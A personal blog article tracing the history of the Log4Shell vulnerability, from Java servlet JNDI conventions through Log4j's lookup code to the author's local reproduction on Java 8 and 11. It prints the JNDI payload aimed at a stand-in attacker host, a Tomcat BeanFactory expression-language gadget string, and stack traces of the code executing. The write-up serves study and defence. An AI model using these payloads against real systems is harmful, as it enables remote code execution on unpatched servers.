# Log4Shell exploit story
*November 13, 2026*


>In December 2021, the Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)) exploit made a lot of noise, and I want to tell you the long story of how it became possible.

In 1999, 64 MB of RAM was normal for a server (not 64 GB), and it was too expensive to run each Java web application in a separate JVM. So, the Java Servlet 2.2 specification introduced the WAR file format - a ZIP archive with the content that defines a Java web application. Apache Tomcat 3.0 supported deployment of several WAR files in one JVM. In 2001, the Java Servlet 2.3 specification was introduced, and it mentions JNDI lookups with the `java:comp/env` prefix.

In 2007, Logback added a new feature: configuring logging according to JNDI lookups for constant names
 `JNDI_CONFIGURATION_RESOURCE = "java:comp/env/logback/configuration-resource"` and `JNDI_CONTEXT_NAME = "java:comp/env/logback/context-name"`. No security issue [here](https://github.com/qos-ch/logback/commit/ae37a91bcc26a0366b20d30c00b97ea183bbd692).

 But in 2013, Log4j decided to get feature parity and created [LOG4J2-313](https://issues.apache.org/jira/browse/LOG4J2-313). The intended use was only in configuration files like `<Routes pattern="$${jndi:logging/context-name}">`. There were already many other string substitutors; one more did not look dangerous. But the java:comp/env prefix was added like that:

```java
    private String convertJndiName(String jndiName) {
        if (!jndiName.startsWith(CONTAINER_JNDI_RESOURCE_PATH_PREFIX) && jndiName.indexOf(':') == -1) {
            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;
        }

        return jndiName;
    }
```    

where

```java 
static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = "java:comp/env/";
```

I totally understand this approach: accept everything and give the admin maximum flexibility for configuration. If the prefix is already in place, that's OK. If there is a colon, do not touch anything; the admin knows better. The problem was that `org.apache.logging.log4j.core.lookup.Interpolator` was used not only for configuration files, but also for ordinary log messages, where a developer can log anything, including user input. If a user enters `${jndi:key}`,  `java:comp/env/key` value will be logged (if configured). `${env:PASSWORD}` also works for many Log4j versions, and this is another security issue.

And in 2021, when nobody deploys different web applications on the same JVM, attackers discovered that `${jndi:ldap://badCriminal.com:1389/a}` bypasses adding the prefix because of the colon and `javax.naming.InitialContext.lookup()` method would be called with `ldap://badCriminal.com:1389/a` as a parameter. Absolutely nothing in Javadoc says that this method can initialize a class downloaded from the Internet, and using user input as a parameter gives attackers an opportunity for remote code execution.

I searched for **JNDI Injection** and found [detailed slides](https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) from Black Hat USA 2016 conference. I have Java 8u66 installed on my desktop in 2015 (hardware of this machine was totally renewed, and it runs another operating system now) and I used [project published in 2017](https://github.com/mbechler/marshalsec) for the attack part. I wrote an exploit class that prints a stacktrace: 

```
java.lang.Exception
	at Exploit.<clinit>(Exploit.java:4)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:348)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:72)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:87)
	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:158)
	at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	...
```

Look at it: all bad things are happening deep inside Java internals. So, the landmine was placed long ago by Sun Microsystems in [RFC 2713](https://www.rfc-editor.org/info/rfc2713/). I am not an expert in the LDAP protocol, but it seems to me a very strange idea to download bytecode from an LDAP server and run it. 

So, until [Java 8u191 released in 2018](https://mbechler.github.io/2018/11/01/Java-CVE-2018-3149/) Log4Shell exploit was available even for kids. But as [Veracode team explained in 2019](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) - this is not a complete solution.

To reproduce the exploit I added dependency `implementation("org.apache.tomcat:tomcat-catalina:8.0.1")` for attacker RMI server - this is good enough for importing `org.apache.naming.ResourceRef`.

For the target I added dependencies 
```
    implementation("org.apache.tomcat:tomcat-catalina:8.5.20")
    implementation("org.apache.tomcat:tomcat-jasper-el:8.5.20")
```

For the RCE I create `ClassThatPrintsExceptionInConstructor` and modified attacker part for it: 

```java
	ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"ClassThatPrintsExceptionInConstructor\").newInstance()"));
```

After this changes 

```java
	logger.error("${jndi:rmi://127.0.0.1:1097/Object}");
```
gives the following stack trace for Java 11:

```
java.lang.Exception
	at ClassThatPrintsExceptionInConstructor.<init>(ClassThatPrintsExceptionInConstructor.java:4)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490)
	at java.base/java.lang.Class.newInstance(Class.java:584)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at javax.el.BeanELResolver.invoke(BeanELResolver.java:158)
	at javax.el.CompositeELResolver.invoke(CompositeELResolver.java:79)
	at org.apache.el.parser.AstValue.getValue(AstValue.java:159)
	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:184)
	at javax.el.ELProcessor.getValue(ELProcessor.java:61)
	at javax.el.ELProcessor.eval(ELProcessor.java:54)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:211)
	at java.naming/javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:341)
	at jdk.naming.rmi/com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
	at jdk.naming.rmi/com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:139)
	at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:220)
	at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
```
It also works for Java 11, but for Java 17 I didn't reproduce the exploit (it does not mean that Java 17 is safe).

Maybe this exploit is too complex for kids, but there were a lot of Java 11/Tomcat 8 servers in 2021.

3 more related CVEs were discovered in Log4j later: [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/cve-2021-45046), [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/cve-2021-44832) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/cve-2021-45105), but the impact was not that huge.

Remote code downloading in JNDI is permanently disabled in [Java 24](https://bugs.openjdk.org/browse/JDK-8338536).

Why am I writing this article in 2026? Because I am looking for a job in Israel, and cybersecurity companies here are growing fast. So, I did this research to improve my skills. And it is clear why demand is growing for cybersecurity solutions: against attackers with AI, we need much more serious defence.

